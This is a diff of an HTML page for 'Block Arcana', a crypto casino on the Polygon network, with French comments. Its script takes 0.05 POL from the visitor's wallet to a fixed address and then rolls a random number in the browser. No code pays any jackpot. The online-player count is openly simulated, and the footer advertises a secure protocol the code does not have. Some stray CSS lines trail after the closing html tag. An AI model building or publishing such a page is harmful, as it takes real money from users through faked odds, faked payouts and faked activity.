@@ -3,37 +3,234 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Block Arcana | Exclusive Gaming</title>
+    <title>Block Arcana | Live Casino</title>
     <style>
+        /* Design Pur & Sombre pour une lecture parfaite */
         body {
-            background-image: url('1769247109491.png');
-            background-repeat: repeat;
-            background-size: 110px;
-            background-color: #08080a;
+            background-color: #050505;
+            background: radial-gradient(circle at center, #111111 0%, #050505 100%);
             color: #ffffff;
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             text-align: center;
             margin: 0;
             padding: 0;
             min-height: 100vh;
         }
 
+        /* Barre de Stats Fixe en haut */
+        .stats-header {
+            background: rgba(0, 255, 255, 0.08);
+            border-bottom: 1px solid rgba(0, 255, 255, 0.2);
+            padding: 12px;
+            font-size: 0.85em;
+            display: flex;
+            justify-content: space-around;
+            backdrop-filter: blur(15px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            letter-spacing: 1px;
+        }
+
         .overlay {
-            background: rgba(8, 8, 10, 0.90); 
-            min-height: 100vh;
             padding: 50px 20px;
         }
 
-        /* Le Nom : Style Italique et Brillant comme le logo */
+        .live-dot {
+            color: #00ff00;
+            font-size: 0.7em;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 25px;
+            display: block;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        /* Titre Elegant */
         .header {
-            font-family: 'Georgia', serif; /* Plus élégant pour l'italique */
+            font-family: "Georgia", serif;
             font-style: italic;
-            font-size: 3em;
+            font-size: 3.2em;
             font-weight: 300;
-            color: #fff;
-            margin-bottom: 30px;
-            background: linear-gradient(to right, #fff 20%, #ff00ff 40%, #00ffff 60%, #fff 80%);
+            margin: 10px 0;
+            background: linear-gradient(to right, #ffffff, #ff00ff, #00ffff, #ffffff);
             background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shine 5s linear infinite;
+        }
+
+        @keyframes shine { to { background-position: 200% center; } }
+
+        /* Carte du Jackpot ultra-lisible */
+        .jackpot-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            padding: 35px 20px;
+            margin: 30px auto;
+            max-width: 320px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.7);
+        }
+
+        .label {
+            font-size: 0.75em;
+            color: #00ffff;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            margin-bottom: 10px;
+        }
+
+        #jackpotValue { 
+            color: #00ff00;
+            font-size: 2.8em;
+            font-weight: bold; 
+            text-shadow: 0 0 25px rgba(0, 255, 0, 0.5);
+            margin: 15px 0;
+        }
+
+        /* Bouton Action */
+        .btn-bet {
+            background: linear-gradient(135deg, #ff00ff, #7000ff);
+            border: none;
+            padding: 22px 60px;
+            color: white;
+            font-weight: bold;
+            border-radius: 60px;
+            cursor: pointer;
+            font-size: 1.3em;
+            box-shadow: 0 10px 25px rgba(255, 0, 255, 0.4);
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .btn-bet:hover { transform: scale(1.05); box-shadow: 0 15px 35px rgba(255, 0, 255, 0.6); }
+        .btn-bet:active { transform: scale(0.95); }
+
+        #status {
+            margin-top: 25px;
+            color: #ff00ff;
+            font-weight: bold;
+            font-size: 0.9em;
+            height: 24px;
+        }
+
+        .footer {
+            margin-top: 60px;
+            font-size: 0.65em;
+            color: #444;
+            letter-spacing: 2px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="stats-header">
+    <span>👥 <span id="online-players">--</span> EN LIGNE</span>
+    <span>👁️ <span id="v-count">...</span> VISITES</span>
+</div>
+
+<div class="overlay">
+    <span class="live-dot">● SESSION ACTIVE</span>
+    <h1 class="header">Block Arcana</h1>
+    
+    <div class="jackpot-card">
+        <div class="label">Current Jackpot</div>
+        <h2 id="jackpotValue">0.0500 POL</h2>
+        <div style="font-size: 0.8em; color: #888;">Entry: 0.05 POL</div>
+    </div>
+
+    <button class="btn-bet" onclick="playGame()">SPIN & BET</button>
+    <div id="status"></div>
+
+    <div class="footer">
+        POWERED BY POLYGON NETWORK<br>
+        ANONYMOUS & SECURE PROTOCOL v2.0
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+<script>
+    let currentJackpot = 0.0500;
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+    // Simulation de trafic
+    function updateStats() {
+        document.getElementById("online-players").innerText = Math.floor(Math.random() * 8) + 14;
+    }
+    setInterval(updateStats, 7000); 
+    updateStats();
+
+    // Compteur de visites (Vérification si l'API répond)
+    fetch("https://api.countapi.xyz/hit/blockarcana2026/visits")
+        .then(res => res.json())
+        .then(data => document.getElementById("v-count").innerText = data.value)
+        .catch(() => document.getElementById("v-count").innerText = "LIVE");
+
+    function playSound(f, d, type="sine") {
+        if (audioCtx.state === "suspended") audioCtx.resume();
+        const o = audioCtx.createOscillator();
+        const g = audioCtx.createGain();
+        o.type = type;
+        o.frequency.value = f;
+        g.gain.setValueAtTime(0.1, audioCtx.currentTime);
+        g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + d);
+        o.connect(g);
+        g.connect(audioCtx.destination);
+        o.start();
+        o.stop(audioCtx.currentTime + d);
+    }
+
+    async function playGame() {
+        playSound(500, 0.1, "square");
+        const status = document.getElementById("status");
+
+        if (typeof window.ethereum !== "undefined") {
+            try {
+                status.innerText = "CONNEXION AU WALLET...";
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                const signer = provider.getSigner();
+
+                status.innerText = "EN ATTENTE DE CONFIRMATION...";
+                const tx = { 
+                    to: "0x8e25e9858679f29193233f7d5d9939105408d257", 
+                    value: ethers.utils.parseEther("0.05") 
+                };
+
+                const transaction = await signer.sendTransaction(tx);
+                status.innerText = "LE DESTIN EST EN MARCHE...";
+                await transaction.wait();
+
+                const roll = Math.floor(Math.random() * 50) + 1;
+                
+                if (roll === 7) {
+                    status.innerText = "JACKPOT !!!";
+                    confetti({ particleCount: 200, spread: 80, origin: { y: 0.6 } });
+                    playSound(600, 0.6, "triangle");
+                    alert("🎰 INCROYABLE ! JACKPOT DÉCROCHÉ !");
+                } else {
+                    status.innerText = "";
+                    playSound(200, 0.4, "sawtooth");
+                    alert("Pas cette fois ! Le jackpot augmente.");
+                    currentJackpot += 0.05;
+                    document.getElementById("jackpotValue").innerText = currentJackpot.toFixed(4) + " POL";
+                }
+            } catch (e) { 
+                status.innerText = "";
+                alert("Transaction annulée."); 
+            }
+        } else {
+            alert("Veuillez utiliser MetaMask ou un navigateur Web3.");
+        }
+    }
+</script>
+</body>
+</html>
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             animation: shine 4s linear infinite;
